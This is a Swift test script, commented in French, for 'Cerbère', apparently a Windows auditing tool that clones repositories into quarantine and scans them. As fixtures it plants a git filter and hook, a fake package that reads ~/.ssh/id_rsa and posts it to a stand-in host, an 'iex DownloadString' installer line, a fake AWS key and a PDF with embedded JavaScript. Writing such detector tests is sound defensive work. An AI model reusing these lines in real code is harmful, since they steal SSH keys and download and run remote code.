// Essais de Cerbère sur Windows (scripts/essais-cerbere-windows.ps1) : compilés avec le moteur (Shared, Commun, Windows)
// et la fabrique de programmes Windows des essais du Mac. Tout est fabriqué ici : rien n'est téléchargé, et rien de
// ce qui est audité n'est lancé (le seul programme lancé depuis la quarantaine est une copie de whoami.exe de Windows,
// pour prouver qu'il ne peut pas l'être).
import Foundation
import WinSDK

/// La fabrique des essais du Mac (`Tests/FabriqueWindows.swift`) étend ce type.
enum Fabrique {}

var echecs = 0
func essai(_ nom: String, _ corps: () throws -> Bool) {
    var ok = false, detail = ""
    do { ok = try corps() } catch { detail = " (\(error))" }
    if !ok { echecs += 1 }
    print("\(ok ? "OK    " : "ÉCHEC ") \(nom)\(detail)")
}

let fm = FileManager.default
let atelier = fm.temporaryDirectory.appending(path: "cerbere-essais-\(UUID().uuidString.prefix(8))")
let racine = atelier.appending(path: "quarantaine")
try fm.createDirectory(at: atelier, withIntermediateDirectories: true)
defer { Plateforme.supprimer(atelier) }

func ecrire(_ fichiers: [String: String], dans dossier: URL) throws {
    for (chemin, texte) in fichiers {
        let url = dossier.appending(path: chemin)
        try fm.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        try Data(texte.utf8).write(to: url)
    }
}

@discardableResult
func lancer(_ outil: String, _ arguments: [String], environnement: [String: String]? = nil, dossier: URL? = nil) -> Int32 {
    let p = Process()
    p.executableURL = URL(fileURLWithPath: outil)
    p.arguments = arguments
    if let environnement { p.environment = environnement }
    if let dossier { p.currentDirectoryURL = dossier }
    p.standardOutput = FileHandle.nullDevice
    p.standardError = FileHandle.nullDevice
    do { try p.run() } catch { return -1 }
    p.waitUntilExit()
    return p.terminationStatus
}

func definir(_ nom: String, _ valeur: String) {
    _ = nom.withCString(encodedAs: UTF16.self) { n in valeur.withCString(encodedAs: UTF16.self) { SetEnvironmentVariableW(n, $0) } }
}

// MARK: - Clone de quarantaine

// Piège : une configuration git « globale » avec un filtre qui écrit un témoin, et un modèle de dépôt dont le hook
// post-checkout écrit un autre témoin. Un clone ordinaire les déclenche ; le clone de quarantaine ne doit pas.
let piege = atelier.appending(path: "piege")
let temoinFiltre = atelier.appending(path: "temoin-filtre.txt"), temoinHook = atelier.appending(path: "temoin-hook.txt")
func posix(_ url: URL) -> String { Plateforme.relatif(Plateforme.cheminOutil(url.path)) }
try ecrire([
    "config": "[filter \"piege\"]\n\tsmudge = \"\(posix(piege.appending(path: "filtre.sh")))\"\n\trequired = true\n[init]\n\ttemplateDir = \(posix(piege.appending(path: "modele")))\n",
    "filtre.sh": "#!/bin/sh\necho filtre > \"\(posix(temoinFiltre))\"\ncat\n",
    "modele/hooks/post-checkout": "#!/bin/sh\necho hook > \"\(posix(temoinHook))\"\n",
], dans: piege)
let source = atelier.appending(path: "source")
try ecrire(["lisez-moi.txt": "bonjour\n", ".gitattributes": "*.txt filter=piege\n"], dans: source)
let git = Plateforme.git
let gitPropre = Plateforme.environnementGit(maison: atelier).merging(["GIT_AUTHOR_NAME": "essai", "GIT_AUTHOR_EMAIL": "essai@example.invalid",
                                                                      "GIT_COMMITTER_NAME": "essai", "GIT_COMMITTER_EMAIL": "essai@example.invalid"]) { $1 }
lancer(git, ["init", "-q", "-b", "main"], environnement: gitPropre, dossier: source)
lancer(git, ["add", "."], environnement: gitPropre, dossier: source)
lancer(git, ["commit", "-q", "-m", "essai"], environnement: gitPropre, dossier: source)
let adresse = "file:///" + posix(source)

definir("GIT_CONFIG_GLOBAL", Plateforme.cheminOutil(piege.appending(path: "config").path))
essai("le piège marche sur un clone ordinaire (filtre et hook lancés)") {
    let ordinaire = atelier.appending(path: "ordinaire")
    let p = Process(), erreur = Pipe()
    p.executableURL = URL(fileURLWithPath: git)
    p.arguments = ["clone", "-q", adresse, Plateforme.cheminOutil(ordinaire.path) + "-essai"]
    p.standardError = erreur
    try p.run()
    p.waitUntilExit()
    print("       clone ordinaire : code \(p.terminationStatus) : " + String(decoding: erreur.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self).prefix(400))
    lancer(git, ["clone", "-q", adresse, Plateforme.cheminOutil(ordinaire.path)], environnement: ProcessInfo.processInfo.environment)
    return fm.fileExists(atPath: temoinFiltre.path) && fm.fileExists(atPath: temoinHook.path)
}
try? fm.removeItem(at: temoinFiltre)
try? fm.removeItem(at: temoinHook)
var cloneQ: Quarantaine?
essai("le clone de quarantaine ne lance ni filtre ni hook") {
    let q = try Quarantaine.cloner(adresse: adresse, source: adresse, protocole: "file", racine: racine)
    cloneQ = q
    return !fm.fileExists(atPath: temoinFiltre.path) && !fm.fileExists(atPath: temoinHook.path)
        && fm.fileExists(atPath: q.dossier.appending(path: "lisez-moi.txt").path) && !fm.fileExists(atPath: q.dossier.appending(path: ".git").path)
}
definir("GIT_CONFIG_GLOBAL", "")

// MARK: - Droits de la quarantaine

essai("quarantaine : fichiers en lecture seule") {
    guard let q = cloneQ else { return false }
    let url = q.dossier.appending(path: "lisez-moi.txt")
    return (try? Data("modifié".utf8).write(to: url)) == nil
}
essai("quarantaine : un programme copié ne peut pas être lancé (droits NTFS)") {
    let dossier = atelier.appending(path: "programme")
    try fm.createDirectory(at: dossier, withIntermediateDirectories: true)
    try fm.copyItem(atPath: Plateforme.system32 + #"\whoami.exe"#, toPath: dossier.appending(path: "whoami.exe").path)
    guard lancer(Plateforme.system32 + #"\whoami.exe"#, []) == 0 else { return false }   // témoin : il se lance hors quarantaine
    let q = try Quarantaine.copier(dossier: dossier, racine: racine)
    defer { q.supprimer() }
    return lancer(Plateforme.cheminOutil(q.dossier.appending(path: "whoami.exe").path), []) != 0
}
essai("quarantaine supprimée malgré la lecture seule") {
    guard let q = cloneQ else { return false }
    q.supprimer()
    return !fm.fileExists(atPath: q.dossier.path)
}

// MARK: - Empreinte et décompression

essai("SHA-256 identique à celui de Windows (certutil)") {
    let fichier = atelier.appending(path: "empreinte.bin")
    var d = Data(count: 300_001)
    for i in d.indices { d[i] = UInt8(truncatingIfNeeded: i &* 31) }
    try d.write(to: fichier)
    let r = Outil.lancer(Plateforme.system32 + #"\certutil.exe"#, ["-hashfile", Plateforme.cheminOutil(fichier.path), "SHA256"])
    return r.sortie.lowercased().replacingOccurrences(of: " ", with: "").contains(Plateforme.sha256(d))
}

// MARK: - Audits complets

func auditer(_ cible: URL, enLigne: EnLigne = EnLigne()) throws -> Rapport {
    try Audit.auditer(Plateforme.cheminOutil(cible.path), racine: racine, enLigne: enLigne)
}

let voleur = atelier.appending(path: "voleur")
try ecrire([
    "README.md": "# Formateur\n\nMet en forme les fichiers JSON.\n",
    "setup.py": "from setuptools import setup\nsetup(name='formateur', version='1.0', packages=['formateur'])\n",
    "formateur/coeur.py": "import os, urllib.request\n\ndef _synchro():\n    cle = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n    urllib.request.urlopen('https://collecte.example.invalid/c', data=cle.encode())\n",
    "installer.ps1": "iex (New-Object Net.WebClient).DownloadString('https://charge.example.invalid/x.ps1')\n",
    "config.py": "AWS = 'AKIAIOSFODNN7EXAMPLA'\n",
], dans: voleur)
essai("dossier : le voleur de clé SSH est relevé, chemins avec des /") {
    let r = try auditer(voleur)
    print("       \(r.verdict) ; " + r.constats.prefix(6).map { "\($0.regle ?? "ia") \($0.fichier)" }.joined(separator: " | "))
    return r.verdict != .rienDeGrave && r.constats.contains { $0.regle == "sec.cles" && $0.fichier == "formateur/coeur.py" }
        && !r.constats.contains { $0.fichier.contains(#"\"#) }
}
essai("archive zip (tar.exe) : ouverte et auditée") {
    let zip = atelier.appending(path: "voleur.zip")
    guard lancer(Plateforme.tar, ["-a", "-c", "-f", Plateforme.cheminOutil(zip.path), "-C", Plateforme.cheminOutil(voleur.path), "."]) == 0 else { return false }
    let r = try auditer(zip)
    print("       \(r.verdict) ; \(r.constats.count) constats ; non analysé : " + r.nonAnalyse.prefix(3).map { "\($0.fichier) \($0.raison)" }.joined(separator: " | "))
    return r.verdict != .rienDeGrave && r.constats.contains { $0.regle == "sec.cles" && $0.fichier.hasSuffix("formateur/coeur.py") }
}
essai("programme Windows fabriqué : imports, commande et adresse relevés") {
    let exe = atelier.appending(path: "outil.exe")
    try Fabrique.pe().write(to: exe)
    let r = try auditer(exe)
    let regles = Set(r.constats.compactMap(\.regle))
    print("       règles : \(regles.sorted().joined(separator: ", "))")
    return regles.contains("win.injection") && regles.contains("win.sans-signature")
        && r.reseau.domaines.contains { $0.nom == "collecte.example.invalid" }
}
essai("PDF avec JavaScript compressé : décompressé et relevé") {
    // Flux « Flate » : en-tête zlib (78 9C) puis un bloc deflate stocké tel quel.
    let js = Array("app.alert('cerbere'); this.exportDataObject({cName: 'x'});".utf8)
    var flux: [UInt8] = [0x78, 0x9C, 0x01, UInt8(js.count & 0xFF), UInt8(js.count >> 8), UInt8(~js.count & 0xFF), UInt8((~js.count >> 8) & 0xFF)] + js
    flux += [0, 0, 0, 0]
    var pdf = Data("%PDF-1.4\n1 0 obj << /Type /Catalog /OpenAction 2 0 R >> endobj\n2 0 obj << /S /JavaScript /JS 3 0 R >> endobj\n3 0 obj << /Length \(flux.count) /Filter /FlateDecode >>\nstream\n".utf8)
    pdf += Data(flux) + Data("\nendstream endobj\ntrailer << /Root 1 0 R >>\n%%EOF\n".utf8)
    let fichier = atelier.appending(path: "facture.pdf")
    try pdf.write(to: fichier)
    let r = try auditer(fichier)
    return r.constats.contains { $0.fichier.hasSuffix("[contenu]") || $0.extrait.contains("app.alert") }
}
essai("programme signé (git.exe) : signataire lu sans rien envoyer") {
    let r = try auditer(URL(fileURLWithPath: Plateforme.git))
    let c = r.constats.first { $0.regle == "sig.identite" }
    print("       " + (c?.titre ?? "pas de signataire relevé"))
    return c != nil
}

print(echecs == 0 ? "Tous les essais passent." : "\(echecs) essai(s) en échec.")
exit(echecs == 0 ? 0 : 1)
